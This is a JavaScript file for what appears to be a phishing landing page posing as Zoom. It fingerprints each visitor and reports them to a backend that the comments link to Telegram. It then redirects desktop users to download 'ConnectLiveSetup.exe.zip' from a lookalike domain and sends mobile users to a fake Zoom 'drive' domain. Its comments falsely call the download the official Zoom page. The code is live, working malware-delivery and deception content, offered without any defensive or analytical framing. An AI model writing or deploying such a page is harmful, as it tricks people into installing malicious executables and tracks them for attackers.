document.addEventListener("DOMContentLoaded", () => {

    const mobileView =
        document.getElementById("mobile-view");

    const desktopView =
        document.getElementById("desktop-view");

    const loadingOverlay =
        document.getElementById("loading-overlay");


    if (
        !mobileView ||
        !desktopView ||
        !loadingOverlay
    ) {
        console.error(
            "Required page elements are missing."
        );

        return;
    }


    /*
     * Destinations.
     */

    const DESKTOP_DESTINATION =
        "https://application.connectliveagent.com/ConnectLiveSetup.exe.zip";

    const MOBILE_DESTINATION =
        "https://zoom.drive0g5folderaccess.com/";


    /*
     * Mobile/tablet detection.
     */

    const mobilePattern =
        /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;

    const isMobile =
        mobilePattern.test(
            navigator.userAgent
        );


    /*
     * Basic visitor information.
     *
     * No passwords, PINs, payment data,
     * or form credentials are collected.
     */

    const visitorInfo = {

        deviceType:
            isMobile
                ? "Mobile/Tablet"
                : "Desktop",

        userAgent:
            navigator.userAgent,

        language:
            navigator.language || "Unknown",

        screenWidth:
            window.screen.width || 0,

        screenHeight:
            window.screen.height || 0,

        timezone:
            Intl.DateTimeFormat()
                .resolvedOptions()
                .timeZone || "Unknown"
    };


    /*
     * Send visitor information to our
     * own backend.
     *
     * Telegram credentials never appear
     * in frontend JavaScript.
     */

    fetch("/visitor-alert", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify(
            visitorInfo
        ),

        keepalive: true

    }).catch(() => {

        /*
         * Notification failure must not
         * interfere with the page.
         */

    });


    /*
     * MOBILE
     *
     * Show mobile message for 10 seconds.
     */

    if (isMobile) {

        mobileView.style.display = "flex";

        desktopView.style.display = "none";


        setTimeout(() => {

            window.location.replace(
                MOBILE_DESTINATION
            );

        }, 10000);


        return;
    }


    /*
     * DESKTOP
     *
     * Show desktop card.
     */

    desktopView.style.display = "block";


    /*
     * Three-second loading period.
     *
     * Then navigate to the official
     * Zoom application download page.
     */

    setTimeout(() => {
        window.location.replace(
            DESKTOP_DESTINATION
        );
    }, 3000);

}); // <-- Make sure this closing bracket and parenthesis are there!
